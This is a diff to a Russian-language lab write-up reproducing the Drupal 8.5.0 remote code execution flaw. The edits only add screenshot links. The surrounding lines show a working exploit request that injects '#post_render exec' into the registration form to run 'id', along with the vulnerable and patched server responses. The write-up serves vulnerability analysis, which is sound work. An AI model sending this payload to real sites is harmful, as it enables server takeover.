@@ -22,7 +22,7 @@ docker-compose up -d
 - Использовать SQLite в качестве базы данных
 - Завершить установку Drupal
 
-[screenshot_drupal_installation]
+![screenshot_drupal_installation](./2.png)
 
 ### 3. Эксплуатация уязвимости
 Отправка malicious-запроса через Burp Suite:
@@ -36,7 +36,7 @@ Content-Length: 103
 form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
 ```
 
-[screenshot_exploit_request]
+[screenshot_exploit_request](./3.png)
 
 ### 4. Результат эксплуатации (уязвимая версия)
 Уязвимая версия Drupal 8.5.0 выполняет команду `id` и возвращает результат:
@@ -45,8 +45,9 @@ form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=
 [{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
 ```
 
-[screenshot_exploit_success]
+[screenshot_exploit_success](./4.png)
 
+[screenshot_exploit_success](./5.png)
 ## Анализ Root Cause
 
 ### Причина уязвимости
@@ -111,7 +112,7 @@ Content-Type: application/json
 [{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
 ```
 
-[screenshot_fixed_response]
+[screenshot_fixed_response](./6.png)
 
 ### Анализ результатов
 - **Статус**: 200 OK (нормальная обработка запроса)
